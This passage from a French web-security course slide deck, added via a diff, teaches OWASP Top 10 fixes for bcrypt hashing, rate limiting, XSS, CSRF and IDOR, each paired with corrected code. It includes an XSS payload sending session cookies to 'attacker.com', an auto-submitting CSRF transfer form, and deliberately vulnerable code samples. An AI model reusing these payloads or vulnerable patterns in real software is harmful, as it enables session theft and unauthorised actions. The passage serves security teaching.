+            <p><strong>Fichiers :</strong> <code>auth.router.ts</code> · <code>seed.ts</code></p>
+
+            <ol>
+              <li>Hacher les mots de passe dans le seed avec <code>bcrypt.hash()</code></li>
+              <li>Remplacer la comparaison par <code>bcrypt.compare()</code></li>
+              <li>Relancer <code>pnpm db:seed</code></li>
+              <li>Vérifier dans SQLite Viewer : <code>$2a$12$...</code></li>
+              <li>Vérifier : le login normal fonctionne toujours</li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 3</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — Cryptographie</h3>
+
+            <p>
+              Pourquoi deux appels à <code>bcrypt.hash("123secret", 12)</code><br />produisent-ils
+              des hashes différents ?
+            </p>
+
+            <div class="fragment">
+              <p>
+                Parce que bcrypt génère un <strong>salt aléatoire unique</strong><br />à chaque
+                appel, intégré dans le hash lui-même.
+              </p>
+
+              <p class="small text-success">C'est ce qui empêche les attaques par rainbow table.</p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 7 — A07 · BRUTEFORCE / RATE LIMITING                 -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A07</span>
+            <h2>Bruteforce &amp; Rate Limiting</h2>
+            <p>Limiter les tentatives d'authentification</p>
+          </section>
+
+          <section>
+            <h3>Bruteforce vs Credential Stuffing</h3>
+
+            <div class="two-col">
+              <div>
+                <h4 class="text-danger">Bruteforce</h4>
+                <p class="small">Tester toutes les combinaisons possibles</p>
+                <p class="small">aaa, aab, aac…<br />Très lent, taux de succès faible</p>
+              </div>
+
+              <div>
+                <h4 class="text-warning">Credential Stuffing</h4>
+                <p class="small">
+                  Rejouer des couples email/mdp issus de <strong>fuites de données</strong>
+                </p>
+
+                <p class="small">
+                  Beaucoup d'utilisateurs réutilisent leurs mots de passe → taux bien plus élevé
+                </p>
+              </div>
+            </div>
+          </section>
+
+          <section>
+            <h3>Démo — Bruteforce sans protection</h3>
+
+            <pre><code class="language-bash" data-trim>
+$ node starter/brute-force-demo.mjs
+    </code></pre>
+
+            <pre><code class="language-text" data-trim>
+Tentative  1 → HTTP 401
+Tentative  2 → HTTP 401
+Tentative  3 → HTTP 401
+...
+Tentative 10 → HTTP 401
+# Jamais de 429 → aucune limite !
+    </code></pre>
+
+            <p class="fragment text-danger">
+              Un vrai attaquant envoie des <strong>millions</strong> de requêtes,<br />en parallèle,
+              depuis plusieurs IPs.
+            </p>
+
+            <aside class="notes">
+              Lancer le script en live. Les 10 réponses HTTP 401 illustrent l'absence de protection.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Correction — Rate Limiting</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+import { createRateLimiter }
+  from '@/middlewares/rate-limit.middleware.js';
+
+const loginRateLimiter = createRateLimiter(
+  5,               // max 5 tentatives
+  15 * 60 * 1000,  // par fenêtre de 15 minutes
+);
+
+router.post('/login',
+  loginRateLimiter,  // ← middleware de protection
+  validate(loginSchema),
+  async (req, res) =&gt; { /* ... */ }
+);
+    </code></pre>
+            <p class="fragment text-success">
+              Après 5 échecs → <strong>HTTP 429 Too Many Requests</strong> ✅
+            </p>
+          </section>
+
+          <section>
+            <h3>Limites et défenses complémentaires</h3>
+
+            <p class="small">Le rate limiting par IP est contournable (botnets).</p>
+
+            <ul>
+              <li class="fragment">CAPTCHA après N échecs</li>
+              <li class="fragment">Verrouillage de compte temporaire</li>
+              <li class="fragment">Alerte email à l'utilisateur</li>
+              <li class="fragment">Authentification multi-facteur (MFA)</li>
+            </ul>
+
+            <p class="fragment small" style="margin-top: 1em">
+              💡 <code>bcrypt.compare()</code> prend toujours le même temps (protection
+              <em>timing attack</em>).
+            </p>
+
+            <aside class="notes">
+              Timing attack : si la comparaison était instantanée pour un email inconnu mais lente
+              pour un email connu, un attaquant pourrait énumérer les emails valides.
+            </aside>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 4</h3>
+
+            <p>
+              <strong>Fichiers :</strong> <code>rate-limit.middleware.ts</code> ·
+              <code>auth.router.ts</code>
+            </p>
+
+            <ol>
+              <li>Implémenter le rate limiter (5 essais / 15 min)</li>
+              <li>L'appliquer sur <code>POST /login</code></li>
+              <li>Relancer <code>node starter/brute-force-demo.mjs</code></li>
+              <li>Vérifier : HTTP 429 à partir de la 6ᵉ tentative</li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 4</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — Bruteforce</h3>
+
+            <p>Le rate limiting par IP suffit-il à se protéger<br />du credential stuffing ?</p>
+
+            <div class="fragment">
+              <p class="text-danger"><strong>Non !</strong></p>
+              <p class="small">
+                Un attaquant peut utiliser des <strong>botnets</strong><br />(milliers d'IPs
+                différentes). <br />Il faut combiner : rate limit + CAPTCHA + MFA + alertes.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 8 — A05 · XSS                                        -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A05</span>
+            <h2>Cross-Site Scripting (XSS)</h2>
+            <p>Injection de code JavaScript malveillant</p>
+          </section>
+
+          <section>
+            <h3>Les 3 types de XSS</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Type</th>
+                  <th>Mécanisme</th>
+                  <th>Persistance</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr class="fragment">
+                  <td class="text-danger"><strong>Stocké</strong></td>
+                  <td>Payload sauvegardé en base,<br />servi à tous les visiteurs</td>
+                  <td>Permanent</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td class="text-warning"><strong>Réfléchi</strong></td>
+                  <td>Payload dans l'URL,<br />exécuté si la victime clique</td>
+                  <td>Ponctuel</td>
+                </tr>
+
+                <tr class="fragment">
+                  <td class="text-info"><strong>DOM-based</strong></td>
+                  <td>Injecté via JS côté client,<br />sans passer par le serveur</td>
+                  <td>Côté client</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <aside class="notes">
+              La démo utilise un XSS stocké. C'est le plus dangereux car il touche tous les
+              visiteurs.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Schéma d'attaque — XSS Stocké</h3>
+
+            <div class="attack-flow">
+              <div class="step">
+                🧑‍💻 Attaquant<br /><small
+                  >Poste un commentaire<br />contenant <code>&lt;script&gt;</code></small
+                >
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                🗄️ Base de données<br /><small>Le script est<br />stocké tel quel</small>
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                🌐 Serveur<br /><small>Renvoie le contenu<br />sans échapper</small>
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                👤 Victime<br /><small>Le navigateur<br />exécute le script</small>
+              </div>
+            </div>
+          </section>
+
+          <section>
+            <h3>Scénario réaliste</h3>
+
+            <p class="small">Au lieu d'un simple <code>alert()</code>…</p>
+            <pre><code class="language-html" data-trim>
+&lt;script&gt;
+  document.location =
+    'https://attacker.com/steal?c=' + document.cookie
+&lt;/script&gt;
+    </code></pre>
+
+            <p class="fragment">
+              Ce commentaire <strong>exfiltre le cookie de session</strong><br />de chaque visiteur
+              vers un serveur attaquant.
+            </p>
+
+            <p class="fragment text-danger">
+              Si le cookie n'a pas <code>HttpOnly</code> →<br />l'attaquant récupère une session
+              valide <strong>sans connaître le mot de passe</strong>
+            </p>
+          </section>
+
+          <section>
+            <h3>Code vulnérable</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//! VULNERABLE — A05 : XSS (pas d'échappement HTML)
+const html = comments
+  .map((c) =&gt; `&lt;p&gt;${c.content}&lt;/p&gt;`)
+  .join('');
+
+res.send(html);
+// Si c.content = "&lt;script&gt;alert('XSS')&lt;/script&gt;"
+// → le navigateur exécute le script !
+    </code></pre>
+          </section>
+
+          <section>
+            <h3>Correction — Échappement HTML</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//* SECURE
+import escape from 'escape-html';
+
+const html = comments
+  .map((c) =&gt; `&lt;p&gt;${escape(c.content)}&lt;/p&gt;`)
+  .join('');
+
+// escape() convertit :
+// &lt; → &amp;lt;   &gt; → &amp;gt;   " → &amp;quot;   ' → &amp;#39;
+    </code></pre>
+            <p class="fragment">
+              Résultat : <code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code>
+            </p>
+            <p class="fragment text-success">
+              Le tag est rendu inoffensif → affiché comme texte ✅
+            </p>
+          </section>
+
+          <section>
+            <h3>Lien avec l'étape 1 — CSP</h3>
+
+            <p>
+              <code>Content-Security-Policy</code> peut bloquer<br />l'exécution de scripts inline.
+            </p>
+
+            <p class="fragment">C'est une <strong>défense en profondeur</strong> :</p>
+
+            <ul class="fragment">
+              <li>L'échappement empêche l'injection</li>
+              <li>CSP bloque l'exécution si l'échappement est oublié</li>
+              <li>Les deux couches sont indépendantes</li>
+            </ul>
+
+            <aside class="notes">
+              CSP ne remplace pas l'échappement : un XSS dans un attribut HTML peut exfiltrer des
+              données sans JavaScript (CSS injection, exfiltration via attributs).
+            </aside>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 5</h3>
+
+            <p><strong>Fichier :</strong> <code>src/modules/comment/comment.router.ts</code></p>
+
+            <ol>
+              <li>Ajouter <code>escape-html</code> sur le contenu des commentaires</li>
+              <li>Poster le commentaire XSS via Postman</li>
+              <li>Ouvrir <code>/api/v1/comments</code> dans le navigateur</li>
+              <li>Vérifier : le script s'affiche comme texte, pas d'alerte</li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 5</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — XSS</h3>
+
+            <p>Quel type de XSS est le plus dangereux et pourquoi ?</p>
+
+            <div class="fragment">
+              <p>
+                <strong>XSS Stocké</strong> — le payload est sauvegardé en base<br />et servi à
+                <strong>tous les visiteurs</strong> automatiquement.
+              </p>
+
+              <p class="small">Pas besoin que la victime clique sur un lien malveillant.</p>
+            </div>
+          </section>
+
+          <section data-background-color="#1a2a1a">
+            <h3>🔄 Récap</h3>
+            <table class="smaller">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Vulnérabilité</th>
+                  <th>Correction</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td>1</td>
+                  <td>Security Misconfiguration</td>
+                  <td><code>helmet()</code> + <code>cors()</code></td>
+                </tr>
+
+                <tr>
+                  <td>2</td>
+                  <td>SQL Injection</td>
+                  <td>Requêtes paramétrées (ORM)</td>
+                </tr>
+
+                <tr>
+                  <td>3</td>
+                  <td>Mots de passe en clair</td>
+                  <td><code>bcrypt</code></td>
+                </tr>
+
+                <tr>
+                  <td>4</td>
+                  <td>Bruteforce</td>
+                  <td><code>express-rate-limit</code></td>
+                </tr>
+
+                <tr>
+                  <td>5</td>
+                  <td>XSS</td>
+                  <td><code>escape-html</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 9 — CSRF                                              -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <h2>CSRF</h2>
+            <p>Cross-Site Request Forgery</p>
+          </section>
+
+          <section>
+            <h3>Le principe</h3>
+
+            <p>
+              Le navigateur envoie <strong>automatiquement les cookies</strong><br />avec chaque
+              requête vers un domaine.
+            </p>
+
+            <p class="fragment text-danger">
+              Un site malveillant peut déclencher des actions<br />au nom d'un utilisateur
+              authentifié.
+            </p>
+          </section>
+
+          <section>
+            <h3>Schéma d'attaque</h3>
+
+            <div class="attack-flow">
+              <div class="step">
+                1️⃣ L'utilisateur est<br />connecté à <code>localhost:5000</code><br /><small
+                  >(cookie actif)</small
+                >
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                2️⃣ Il visite<br /><code>attack.html</code><br /><small>(site malveillant)</small>
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                3️⃣ Formulaire<br />auto-soumis vers<br /><code>localhost:5000</code>
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                4️⃣ Le navigateur<br />joint les cookies<br /><small class="text-danger"
+                  >→ requête "légitime"</small
+                >
+              </div>
+            </div>
+          </section>
+
+          <section>
+            <h3>Le code de l'attaque</h3>
+
+            <pre><code class="language-html" data-trim data-line-numbers>
+&lt;!-- attack.html — formulaire auto-soumis --&gt;
+&lt;form action="http://localhost:5000/api/v1/transfers"
+      method="POST"&gt;
+  &lt;input type="hidden" name="amount" value="1000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+    </code></pre>
+
+            <p class="fragment text-danger">
+              Le transfert est exécuté sans que<br />l'utilisateur ait rien fait ! 💸
+            </p>
+
+            <aside class="notes">
+              Ouvrir starter/attack.html directement dans un navigateur. Le formulaire se soumet
+              automatiquement vers localhost:5000.
+            </aside>
+          </section>
+
+          <section>
+            <h3>Double Submit Cookie Pattern</h3>
+
+            <ol>
+              <li class="fragment">Le serveur génère un <strong>token CSRF</strong></li>
+
+              <li class="fragment">
+                Il l'envoie dans un <strong>cookie</strong> ET dans le <strong>formulaire</strong>
+              </li>
+
+              <li class="fragment">
+                À chaque POST, le serveur vérifie que les deux valeurs
+                <strong>correspondent</strong>
+              </li>
+            </ol>
+
+            <p class="fragment" style="margin-top: 1em">
+              Un site tiers <strong>ne peut pas lire</strong> les cookies d'un autre domaine<br />
+              <span class="small">(politique Same-Origin)</span><br />
+              → impossible de construire une requête valide ✅
+            </p>
+          </section>
+
+          <section>
+            <h3>Correction — Vérification du token</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//* SECURE — CSRF Double Submit Cookie
+const tokenFromBody = req.body.csrf;
+const tokenFromCookie = req.cookies.csrf;
+
+if (tokenFromBody !== tokenFromCookie) {
+  throw new ForbiddenError('Invalid CSRF token');
+}
+
+// Le site légitime peut lire son propre cookie
+// Un site tiers ne le peut pas → attaque bloquée
+    </code></pre>
+          </section>
+
+          <section>
+            <h3>Défense complémentaire — SameSite</h3>
+
+            <pre><code class="language-typescript" data-trim>
+res.cookie('session', value, {
+  sameSite: 'strict', // ← bloque l'envoi cross-origin
+});
+    </code></pre>
+            <ul class="fragment">
+              <li><code>SameSite=Strict</code> — aucun envoi cross-origin</li>
+              <li><code>SameSite=Lax</code> — envoi uniquement pour les navigations top-level (dans la barre d'adresse)</li>
+              <li><code>SameSite=None</code> — envoi partout (⚠️ nécessite <code>Secure</code> sinon le cookie ne sera pas envoyé)</li>
+            </ul>
+
+            <aside class="notes">
+              SameSite=Strict est puissant mais récent. Ne pas compter dessus comme seule protection
+              si le support navigateur doit être large. Les APIs JSON sont naturellement plus
+              résistantes (Content-Type: application/json ne peut pas être envoyé par un formulaire
+              HTML).
+            </aside>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 6</h3>
+
+            <p><strong>Fichier :</strong> <code>src/modules/transfer/transfer.router.ts</code></p>
+
+            <ol>
+              <li>Implémenter la vérification du token CSRF</li>
+              <li>Tester : Postman sans token → <strong>HTTP 403</strong></li>
+              <li>Ouvrir <code>/form</code> et soumettre → <strong>HTTP 200</strong></li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 6</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — CSRF</h3>
+
+            <p>
+              Pourquoi un site tiers ne peut-il pas reproduire<br />le Double Submit Cookie Pattern
+              ?
+            </p>
+
+            <div class="fragment">
+              <p>
+                À cause de la <strong>politique Same-Origin</strong> :<br />un site tiers ne peut
+                pas <strong>lire les cookies</strong> d'un autre domaine.
+              </p>
+
+              <p class="small">
+                Il peut déclencher l'envoi du cookie, mais pas en lire la valeur<br />→ impossible
+                de la dupliquer dans le formulaire.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 10 — A01 · BROKEN ACCESS CONTROL / IDOR              -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A01</span>
+            <h2>Broken Access Control</h2>
+            <p>IDOR — Insecure Direct Object Reference</p>
+          </section>
+
+          <section>
+            <h3>Authentification ≠ Autorisation</h3>
+
+            <div class="two-col">
+              <div>
+                <h4 class="text-info">🔑 Authentification</h4>
+                <p><strong>Qui es-tu ?</strong></p>
+                <p class="small">Vérifier l'identité<br />(JWT valide, signature OK, non expiré)</p>
+              </div>
+
+              <div>
+                <h4 class="text-warning">🛡️ Autorisation</h4>
+                <p><strong>As-tu le droit ?</strong></p>
+                <p class="small">
+                  Vérifier les permissions<br />(cette ressource t'appartient-elle ?)
+                </p>
+              </div>
+            </div>
+
+            <p class="fragment text-danger" style="margin-top: 1em">
+              JWT prouve l'identité mais <strong>pas les droits d'accès</strong> !
+            </p>
+
+            <aside class="notes">
+              C'est la vulnérabilité n°1 de l'OWASP Top 10 2025 — la plus répandue en production.
+              Exemples réels : accès aux factures d'autres clients, messages privés, modification de
+              commandes.
+            </aside>
+          </section>
+
+          <section>
+            <h3>L'attaque IDOR</h3>
+
+            <div class="attack-flow">
+              <div class="step">
+                🔑 john.doe<br />se connecte<br /><small>Token JWT (userId: 1)</small>
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                📄 GET /users/<strong>1</strong><br /><span class="text-success"
+                  >✅ Ses données</span
+                >
+              </div>
+              <div class="arrow">→</div>
+              <div class="step">
+                📄 GET /users/<strong>2</strong><br /><span class="text-danger"
+                  >❌ Données de jane !</span
+                >
+              </div>
+            </div>
+            <p class="fragment" style="margin-top: 1em">
+              Il suffit d'<strong>incrémenter l'ID</strong> dans l'URL<br />pour accéder aux données
+              de n'importe qui.
+            </p>
+          </section>
+
+          <section>
+            <h3>Code vulnérable</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//! VULNERABLE — A01 : pas de vérification d'accès
+router.get('/:id', validate(userParamsSchema, 'params'),
+  async (req, res) =&gt; {
+    const { id } = req.params;
+
+    // Pas d'authentification requise !
+    // Pas de vérification que l'utilisateur
+    // demande ses propres données !
+    const user = await getUserById(id);
+    res.json(user);
+  }
+);
+    </code></pre>
+          </section>
+
+          <section>
+            <h3>Correction</h3>
+
+            <pre><code class="language-typescript" data-trim data-line-numbers>
+//* SECURE — authentification + autorisation
+import { requireAuth } from '@/middlewares/auth.middleware.js';
+import { ForbiddenError } from '@/errors/index.js';
+
+router.get('/:id', requireAuth,
+  validate(userParamsSchema, 'params'),
+  async (req, res) =&gt; {
+    const { id } = req.params;
+
+    if (req.user!.userId !== Number(id)) {
+      throw new ForbiddenError(
+        "You don't have permission"
+      );
+    }
+
+    const user = await getUserById(id);
+    res.json(user);
+  }
+);
+    </code></pre>
+          </section>
+
+          <section>
+            <h3>Pour aller plus loin — RBAC</h3>
+
+            <p>Role-Based Access Control</p>
+
+            <pre><code class="language-typescript" data-trim>
+// Un admin peut accéder à tous les profils
+if (!isAdmin(req.user) &amp;&amp; req.user.userId !== id) {
+  throw new ForbiddenError('Access denied');
+}
+    </code></pre>
+
+            <p class="fragment small">
+              Les rôles (admin, user, manager…) permettent<br />une gestion fine des permissions.
+            </p>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 7</h3>
+
+            <p><strong>Fichier :</strong> <code>src/modules/users/users.router.ts</code></p>
+
+            <ol>
+              <li>Ajouter <code>requireAuth</code> sur la route</li>
+              <li>Comparer <code>req.user.userId</code> avec l'ID demandé</li>
+              <li>Tester : <code>/users/2</code> avec token de john → <strong>HTTP 403</strong></li>
+              <li>Tester : <code>/users/1</code> avec token de john → <strong>HTTP 200</strong></li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 7</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — Access Control</h3>
+
+            <p>
+              Un token JWT valide garantit-il que l'utilisateur<br />a le droit d'accéder à la
+              ressource ?
+            </p>
+
+            <div class="fragment">
+              <p class="text-danger"><strong>Non !</strong></p>
+              <p class="small">
+                JWT = <strong>authentification</strong> (qui es-tu ?)<br />
+                L'<strong>autorisation</strong> (as-tu le droit ?) est une vérification
+                <em>séparée</em><br />
+                qui doit être implémentée dans chaque route.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 11 — AUDIT & SAST                                     -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <span class="badge badge-owasp">A03</span>
+            <h2>Audit &amp; Analyse statique</h2>
+            <p>Détecter les vulnérabilités sans exécuter le code</p>
+          </section>
+
+          <section>
+            <h3>Deux outils complémentaires</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>pnpm audit</th>
+                  <th>SAST</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><strong>Analyse</strong></td>
+                  <td>Les dépendances tierces</td>
+                  <td>Votre propre code</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Détecte</strong></td>
+                  <td>CVE publiés</td>
+                  <td>Patterns dangereux</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Exemple</strong></td>
+                  <td>"express@4.18 a une faille"</td>
+                  <td>"cette concaténation SQL<br />est dangereuse"</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <aside class="notes">
+              Analogie : pnpm audit vérifie que les ingrédients ne sont pas rappelés. Le SAST
+              vérifie que votre recette ne contient pas d'étapes dangereuses. Les deux sont
+              nécessaires, aucun ne remplace la revue de code humaine.
+            </aside>
+          </section>
+
+          <section>
+            <h3>pnpm audit</h3>
+
+            <pre><code class="language-bash" data-trim>
+$ cd starter/backend
+$ pnpm audit
+
+# Corriger automatiquement
+$ pnpm audit --fix
+
+# En CI/CD : bloquer si vuln. high ou critical
+$ pnpm audit --audit-level=high
+    </code></pre>
+            <table class="smaller fragment" style="margin-top: 1em">
+              <thead>
+                <tr>
+                  <th>Niveau</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td class="text-success">low</td>
+                  <td>Corriger à l'occasion</td>
+                </tr>
+
+                <tr>
+                  <td class="text-warning">moderate</td>
+                  <td>Risque réel selon le contexte</td>
+                </tr>
+
+                <tr>
+                  <td class="text-danger">high</td>
+                  <td>Corriger avant production</td>
+                </tr>
+
+                <tr>
+                  <td class="text-danger"><strong>critical</strong></td>
+                  <td>Bloquer le déploiement !</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <aside class="notes">
+              Bien distinguer dependencies (production) et devDependencies (build/dev). Une vulnérabilité en
+              devDependency est moins critique. Ne pas paniquer face aux low/moderate.
+            </aside>
+          </section>
+
+          <section>
+            <h3>SAST — Static Application Security Testing</h3>
+
+            <pre><code class="language-text" data-trim>
+Code source → Analyse des patterns → Rapport
+
+"ligne 42 : cette concaténation SQL est dangereuse"
+"ligne 87 : contenu utilisateur injecté sans échappement"
+    </code></pre>
+            <div class="fragment">
+              <p style="margin-top: 1em"><strong>Détecte :</strong></p>
+              <ul class="small">
+                <li>Requêtes SQL par concaténation</li>
+                <li>HTML sans échappement</li>
+                <li>Secrets hardcodés (<code>const apiKey = "sk-..."</code>)</li>
+                <li>Fonctions dangereuses (<code>eval()</code>, <code>exec()</code>)</li>
+              </ul>
+            </div>
+
+            <p class="fragment small text-warning">
+              ⚠️ Ne détecte pas les failles logiques ni les vulnérabilités des dépendances.
+            </p>
+          </section>
+
+          <section>
+            <h3>Intégration CI/CD</h3>
+
+            <pre><code class="language-yaml" data-trim>
+# GitHub Actions
+- name: Audit des dépendances
+  run: pnpm audit --audit-level=high
+
+- name: Analyse statique
+  run: semgrep scan --config "p/javascript" src/ --error
+    </code></pre>
+
+            <p class="fragment">
+              Un pipeline qui <strong>échoue</strong> sur une vulnérabilité critique<br />force
+              l'équipe à traiter la dette de sécurité <strong>avant le merge</strong>.
+            </p>
+          </section>
+
+          <section class="tp-slide">
+            <h3>🎯 TP — Étape 9</h3>
+
+            <ol>
+              <li>Lancer <code>pnpm audit</code> dans <code>starter/backend</code></li>
+              <li>Identifier les vulnérabilités et leur niveau</li>
+              <li>Corriger avec <code>pnpm audit --fix</code></li>
+              <li>Discuter : quelles failles un SAST aurait-il trouvées dans le starter ?</li>
+            </ol>
+
+            <p class="small" style="margin-top: 1em">📖 Guide apprenant — Étape 9</p>
+          </section>
+
+          <section class="quiz-slide">
+            <h3>❓ Quiz — Audit</h3>
+
+            <p>Qu'est-ce qu'un CVE ?</p>
+
+            <div class="fragment">
+              <p>
+                <strong>C</strong>ommon <strong>V</strong>ulnerabilities and
+                <strong>E</strong>xposures
+              </p>
+
+              <p class="small">
+                Identifiant public unique pour une vulnérabilité connue<br />
+                (ex. <code>CVE-2024-12345</code>).<br />
+                <code>pnpm audit</code> compare les dépendances contre cette base.
+              </p>
+            </div>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 12 — BONNES PRATIQUES                                 -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <h2>🛡️ Bonnes pratiques</h2>
+            <p>Principes, outils et checklist</p>
+          </section>
+
+          <section>
+            <h3>3 principes fondamentaux</h3>
+
+            <ol>
+              <li class="fragment">
+                <strong>Validate all input</strong><br />
+                <span class="small"
+                  >Ne jamais faire confiance aux données de l'utilisateur.<br />
+                  Valider le type, le format, la longueur.</span
+                >
+              </li>
+
+              <li class="fragment">
+                <strong>Least privilege</strong><br />
+                <span class="small"
+                  >Accorder uniquement les permissions nécessaires.<br />
+                  Pas d'accès admin par défaut.</span
+                >
+              </li>
+
+              <li class="fragment">
+                <strong>Defense in depth</strong><br />
+                <span class="small"
+                  >Plusieurs couches de protection indépendantes.<br />
+                  Si une couche tombe, les autres tiennent.</span
+                >
+              </li>
+            </ol>
+          </section>
+
+          <section>
+            <h3>🧰 Outils</h3>
+
+            <table>
+              <thead>
+                <tr>
+                  <th>Outil</th>
+                  <th>Usage</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td><strong>OWASP ZAP</strong></td>
+                  <td>Scanner de vulnérabilités web (gratuit)</td>
+                </tr>
+
+                <tr>
+                  <td><strong>pnpm audit</strong></td>
+                  <td>Audit des dépendances (CVE)</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Semgrep</strong></td>
+                  <td>Analyse statique du code (SAST)</td>
+                </tr>
+
+                <tr>
+                  <td><strong>Snyk</strong></td>
+                  <td>Audit + SAST (freemium)</td>
+                </tr>
+
+                <tr>
+                  <td><strong>SonarQube</strong></td>
+                  <td>Qualité + sécurité du code</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section>
+            <h3>✅ Checklist développeur</h3>
+
+            <ul class="small">
+              <li class="fragment">☐ Headers de sécurité configurés (helmet)</li>
+              <li class="fragment">☐ CORS restreint à l'origine autorisée</li>
+              <li class="fragment">☐ Requêtes SQL paramétrées (ORM ou prepared statements)</li>
+              <li class="fragment">☐ Mots de passe hashés (bcrypt, argon2)</li>
+              <li class="fragment">☐ Rate limiting sur les routes sensibles</li>
+              <li class="fragment">☐ Échappement HTML systématique</li>
+              <li class="fragment">☐ Tokens CSRF sur les formulaires</li>
+              <li class="fragment">☐ Contrôle d'accès sur chaque route</li>
+              <li class="fragment">☐ Cookies sécurisés (HttpOnly, SameSite, Secure)</li>
+              <li class="fragment">☐ Audit des dépendances en CI/CD</li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>📚 Ressources</h3>
+
+            <ul>
+              <li><a href="https://owasp.org/Top10/2025/">OWASP Top 10 (2025)</a></li>
+              <li><a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a></li>
+            </ul>
+          </section>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION 13 — ÉVALUATION & CLÔTURE                             -->
+        <!-- ============================================================ -->
+        <section>
+          <section class="section-title">
+            <h2>📝 Évaluation</h2>
+            <p>Récapitulatif et QCM</p>
+          </section>
+
+          <section>
+            <h3>Récapitulatif des 9 étapes</h3>
+
+            <table class="smaller">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Vulnérabilité</th>
+                  <th>Correction</th>
+                </tr>
+              </thead>
+
+              <tbody>
+                <tr>
+                  <td>1</td>
+                  <td>Security Misconfiguration</td>
+                  <td><code>helmet()</code> + <code>cors()</code></td>
+                </tr>
+
+                <tr>
+                  <td>2</td>
+                  <td>SQL Injection</td>
+                  <td>Requêtes paramétrées (Drizzle)</td>
+                </tr>
+
+                <tr>
+                  <td>3</td>
+                  <td>Mots de passe en clair</td>
+                  <td><code>bcrypt</code></td>
+                </tr>
+
+                <tr>
+                  <td>4</td>
+                  <td>Bruteforce</td>
+                  <td><code>express-rate-limit</code></td>
+                </tr>
+
+                <tr>
+                  <td>5</td>
+                  <td>XSS</td>
+                  <td><code>escape-html</code></td>
+                </tr>
+
+                <tr>
+                  <td>6</td>
+                  <td>CSRF</td>
+                  <td>Double Submit Cookie</td>
+                </tr>
+
+                <tr>
+                  <td>7</td>
+                  <td>Broken Access Control</td>
+                  <td><code>requireAuth</code> + userId check</td>
+                </tr>
+
+                <tr>
+                  <td>8</td>
+                  <td>Dépendances + code</td>
+                  <td><code>pnpm audit</code> + SAST</td>
+                </tr>
+              </tbody>
+            </table>
+          </section>
+
+          <section
+            data-background-gradient="linear-gradient(135deg, #f8f9fa 0%, #e9ecef 50%, #dee2e6 100%)"
+          >
+            <h2>Merci ! 🎉</h2>
+
+            <p style="margin-top: 1em">
